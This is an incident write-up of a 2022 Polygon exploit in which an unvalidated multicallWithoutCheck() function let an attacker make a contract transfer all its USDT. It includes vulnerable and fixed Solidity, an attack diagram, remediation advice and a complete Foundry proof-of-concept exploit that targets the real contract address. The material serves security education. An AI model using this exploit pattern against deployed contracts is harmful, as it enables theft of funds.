# MulticallWithoutCheck — Arbitrary Token Transfer Attack via Unvalidated Multicall

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | MulticallWithoutCheck (Polygon) |
| **Chain** | Polygon |
| **Loss** | All USDT held by the contract |
| **Vulnerable Contract** | [0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b](https://polygonscan.com/address/0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b) |
| **USDT (Polygon)** | [0xc2132D05D31c914a87C6611C10748AEb04B58e8F](https://polygonscan.com/address/0xc2132D05D31c914a87C6611C10748AEb04B58e8F) |
| **Root Cause** | `multicallWithoutCheck()` executes arbitrary external calls with no validation on target or calldata |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/MulticallWithoutCheck_exp.sol) |

---
## 1. Vulnerability Overview

This contract provided a multicall feature that batched multiple external calls into a single transaction. The `multicallWithoutCheck()` function, true to its name, performed no validation whatsoever on the call targets or calldata. The attacker crafted a `transfer(attacker, allBalance)` calldata targeting the USDT contract and passed it to `multicallWithoutCheck()`. The contract executed the USDT `transfer()` under its own identity, transferring the entire USDT balance it held to the attacker.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable multicallWithoutCheck() - allows arbitrary external calls
contract MulticallContract {
    struct Call {
        address target;   // target contract to call
        bytes callData;   // calldata to execute
    }

    // ❌ callable by anyone, no validation on target or callData
    function multicallWithoutCheck(Call[] memory calls) external {
        for (uint256 i = 0; i < calls.length; i++) {
            // ❌ executes arbitrary calldata against arbitrary contracts
            // called under this contract's identity (address(this))
            (bool success,) = calls[i].target.call(calls[i].callData);
            require(success, "Call failed");
        }
    }
    // ❌ Result: contract executes USDT.transfer(attacker, balance) as itself
    //    → token transfer possible without prior approval
}

// ✅ Correct pattern - target whitelist + function selector restriction
contract SafeMulticall {
    mapping(address => bool) public allowedTargets;
    mapping(bytes4 => bool) public allowedSelectors;

    function multicall(Call[] memory calls) external {
        for (uint256 i = 0; i < calls.length; i++) {
            // ✅ only call whitelisted contracts
            require(allowedTargets[calls[i].target], "Target not allowed");
            // ✅ only execute whitelisted functions
            bytes4 selector = bytes4(calls[i].callData);
            require(allowedSelectors[selector], "Selector not allowed");
            // ✅ block token-related functions such as transfer, approve, transferFrom
            (bool success,) = calls[i].target.call(calls[i].callData);
            require(success);
        }
    }
}
```


### On-Chain Source Code

Source: Unverified

> ⚠️ No on-chain source code — bytecode only or source unverified

**Vulnerable Function** — `multicallWithoutCheck()`:
```solidity
// ❌ Root cause: `multicallWithoutCheck()` executes external calls with no validation on target or calldata
// Source code unverified — bytecode analysis required
// Vulnerability: `multicallWithoutCheck()` executes external calls with no validation on target or calldata
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Query USDT balance of vulnerable contract
    │       usdtBalance = USDT.balanceOf(target)
    │
    ├─[2] Construct Call struct:
    │       target   = USDT contract address
    │       callData = abi.encodeWithSelector(
    │                   USDT.transfer.selector,
    │                   attacker,
    │                   usdtBalance
    │               )
    │
    ├─[3] Call target.multicallWithoutCheck([call])
    │       └─ Contract executes USDT.transfer(attacker, usdtBalance)
    │           ❌ No validation on target or calldata
    │           ❌ Contract executes transfer as itself — no approve required
    │
    └─[4] Attacker USDT balance = former vulnerable contract USDT balance
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IMulticall {
    struct Call {
        address target;
        bytes callData;
    }
    // ❌ multi-call function with no validation
    function multicallWithoutCheck(Call[] memory calls) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract MulticallExploit is Test {
    IMulticall target = IMulticall(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b);
    IERC20 USDT       = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);

    function setUp() public {
        vm.createSelectFork("polygon", 34_743_770);
    }

    function testExploit() public {
        address attacker = address(this);
        uint256 targetBalance = USDT.balanceOf(address(target));

        emit log_named_decimal_uint("[Before] Contract USDT", targetBalance, 6);
        emit log_named_decimal_uint("[Before] Attacker USDT", USDT.balanceOf(attacker), 6);

        // [Step 1] Construct USDT transfer calldata
        bytes memory transferData = abi.encodeWithSelector(
            bytes4(keccak256("transfer(address,uint256)")),
            attacker,
            targetBalance
        );

        // [Step 2] Construct Call array
        IMulticall.Call[] memory calls = new IMulticall.Call[](1);
        calls[0] = IMulticall.Call({
            target: address(USDT),  // ← USDT contract
            callData: transferData  // ← transfer(attacker, all)
        });

        // [Step 3] Call multicallWithoutCheck()
        // ⚡ Contract executes USDT.transfer() under its own identity
        target.multicallWithoutCheck(calls);

        emit log_named_decimal_uint("[After] Contract USDT", USDT.balanceOf(address(target)), 6);
        emit log_named_decimal_uint("[After] Attacker USDT", USDT.balanceOf(attacker), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unvalidated Arbitrary External Call |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary Call Vulnerability |
| **Attack Vector** | `multicallWithoutCheck([{target: USDT, data: transfer(attacker, all)}])` |
| **Precondition** | Multicall function does not validate target or calldata |
| **Impact** | Total loss of all USDT held by the contract |

---
## 6. Remediation Recommendations

1. **Target Whitelist**: Restrict contracts that the multicall can invoke to a pre-registered allowlist of addresses.
2. **Function Selector Blocklist**: Register token transfer-related function selectors — `transfer()`, `transferFrom()`, `approve()` — in a blocklist.
3. **Token Address Exclusion**: Explicitly exclude token addresses held by the contract from multicall targets.
4. **Access Control**: Restrict the multicall function to `onlyOwner` or a specific role.

---
## 7. Lessons Learned

- **Risk of the Multicall Pattern**: The `multicall()` or `execute()` pattern improves convenience, but when a contract executes arbitrary external calls under its own identity, all assets it holds are at risk. The fact that the name itself contains "WithoutCheck" is a red flag in its own right.
- **Calls Under the Contract's Identity**: Functions executed via `address(this).call(data)` make the contract itself the `msg.sender`. In the case of USDT, this allows the contract to transfer its own balance without any prior `approve`.
- **Self-Incriminating Function Names**: When a function name contains "WithoutCheck," recognize that the function may be dangerous and scrutinize it thoroughly. Develop the habit of looking for warning signals in names during code review.